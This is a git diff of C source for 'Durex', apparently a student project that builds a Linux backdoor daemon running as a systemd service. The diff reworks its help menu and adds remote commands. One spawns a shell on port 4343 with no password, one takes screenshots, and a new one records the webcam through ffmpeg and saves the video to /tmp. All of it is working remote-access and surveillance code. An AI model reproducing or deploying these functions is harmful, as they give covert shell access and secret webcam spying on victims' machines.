@@ -6,7 +6,7 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/28 16:59:54 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/29 17:04:47 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,28 +25,29 @@ extern char **environ;
 
 static t_bool	server_cmd_help(t_client *client, t_server *server)
 {
-	char *help_content = ""
-		"\n   ======================================================================   \n"
-		"============================================================================\n"
-		COLORIZE(SH_YELLOW, " Durex commands:\n")
+	char *help_content = "\n"
+		COLORIZE(SH_YELLOW, " • Durex commands:\n")
 		"\t'help' or '?'\t- Show this message.\n"
 		"\t'exit'\t\t- Quit Durex.\n"
-		"\t'shell'\t\t- Spawn a shell on port 4343.\n"
+		"\t'shell'\t\t- Spawn a shell on port 4343.\n\n"
+		COLORIZE(SH_YELLOW, " • Bonus commands:\n")
 		"\t'uninstall'\t- Uninstall Durex. (/!\\ kill Durex daemon on success /!\\)\n"
 		"\t'log'\t\t- Print durex log file.\n"
-		"\t'stat'\t\t- Print status and information about durex.\n\n"
-		COLORIZE(SH_YELLOW, " Informations:\n")
+		"\t'stat'\t\t- Print status and information about durex.\n"
+		"\t'screenshot'\t- Take screenshot of the screen and save it to /tmp folder.\n"
+		"\t'camvid'\t- Record video using webcam and save it to /tmp folder.\n\n"
+		COLORIZE(SH_YELLOW, " • Informations:\n")
 		" * You can check install status with 'stat' command.\n"
 		" * You can check service status by running: systemctl status durex in shell.\n"
 		" * A corrupt installation mean, one of this file is missing:\n\t"
-		SERVICE_FILE "\n\t" SERVICE_INSTALL_FILE "\n\t" SERVICE_BIN "\n"
-		COLORIZE(SH_YELLOW, " Manual Uninstall:\n")
+		SERVICE_FILE "\n\t" SERVICE_INSTALL_FILE "\n\t" SERVICE_BIN "\n\n"
+		COLORIZE(SH_YELLOW, " • Manual Uninstall:\n")
 		" Spawn a shell, using 'shell' then run each following commands:\n"
 		" systemctl stop durex;\n systemctl disable durex;\n systemtcl daemon-reload;\n"
 		" systemctl reset-failed;\n rm /var/lock/durex.lock;\n"
 		" And finally remove all listed file in Informations sections.\n"
-		"============================================================================\n"
-		"   ======================================================================   \n\n";
+		" For a full uninstall, you can also remove this packages : ffmpeg, imagemagick-6.q16\n"
+		"\n";
 	if (!server || !client)
 		return (false);
 	send_text(help_content, client->socket);
@@ -116,9 +117,11 @@ static t_bool	server_cmd_shell(t_client *client, t_server *server)
 	{
 		ft_memset(&remote_shell, 0, sizeof(remote_shell));
 		remote_shell.require_pass = false;
-		close(server->socket);
 		if (create_server(&remote_shell, 4343, 2))
+		{
+			close(server->socket);
 			shell_wait(&remote_shell, client);
+		}
 		send_text(COLORIZE(SH_RED, "\t• ") "Failed, wait and retry.\n"SERVER_PROMPT, client->socket);
 		close(client->socket);
 		durex_log("The remote shell has failed.", LOG_WARNING);
@@ -191,6 +194,8 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 
 	if (!server || !client)
 		return (false);
+
+	// Generate informations about Durex
 	header = COLORIZE(SH_BLUE, "• ") "Durex status:\n\t";
 	if (durex_is_installed())
 		install_status = "Durex install: "COLORIZE(SH_GREEN, "• ")
@@ -200,12 +205,16 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 			"Not install or corrupt. (see help)\n\tConnexions:\n\t";
 	clients = get_client_list(server);
 	sprintf(footer, "Durex running since: %.0f seconds.\n", difftime(time(NULL), server->start_time));
+
+	// Grab all informations in one string
 	status_len = ft_strlen(header) + ft_strlen(install_status) + ft_strlen(clients) + ft_strlen(footer);
 	final_status = ft_strnew(status_len);
 	ft_strncpy(final_status, header, ft_strlen(header));
 	ft_strncat(final_status, install_status, ft_strlen(install_status));
 	ft_strncat(final_status, clients, ft_strlen(clients));
 	ft_strncat(final_status, footer, ft_strlen(footer));
+
+	// Send data to client
 	send_text(final_status, client->socket);
 	ft_strdel(&final_status);
 	ft_strdel(&clients);
@@ -219,7 +228,36 @@ static t_bool	server_cmd_screenshot(t_client *client, t_server *server)
 
 	if (!server || !client)
 		return (false);
-	exec_command(screenshot, "Taking screenshot ...", env);
+	exec_command(screenshot, "Taking screenshot ...", env, client->socket);
+	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tScreenshot are saved in /tmp folder.\n", client->socket);
+	send_text("\tIf the command failed, try install imagemagick-6.q16 using shell.\n", client->socket);
+	return (true);
+}
+
+static t_bool	server_cmd_camvid(t_client *client, t_server *server)
+{
+	char	*camvid[] =
+		{
+		 	"/usr/bin/ffmpeg",
+			"-f", "v4l2",
+			"-framerate", "25",
+			"-video_size", "640x480",
+			"-t", NAMEOF_CONTENT(VIDEO_RECORD_TIME),
+			"-i", "/dev/video0",
+			"/tmp/camvid_"__TIME__".mkv",
+			"-y",
+			"-timelimit", NAMEOF_CONTENT(VIDEO_RECORD_LIMIT),
+			"-err_detect",
+			"-xerror",
+			NULL,
+		};
+
+	if (!server || !client)
+		return (false);
+	send_text(COLORIZE(SH_RED, "• ")"Recording webcam /dev/video0 ...\n", client->socket);
+	exec_command(camvid, "Capturing webcam ...", NULL, -1);
+	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tVideo are saved in /tmp folder.\n", client->socket);
+	send_text("\tIf the command failed, try install ffmpeg using shell.\n", client->socket);
 	return (true);
 }
 
@@ -233,6 +271,7 @@ static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
 	[LOG] = COMMAND(log),
 	[EXIT] = COMMAND(exit),
 	[SCREENSHOT] = COMMAND(screenshot),
+	[CAMVID] = COMMAND(camvid),
 };
 
 void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
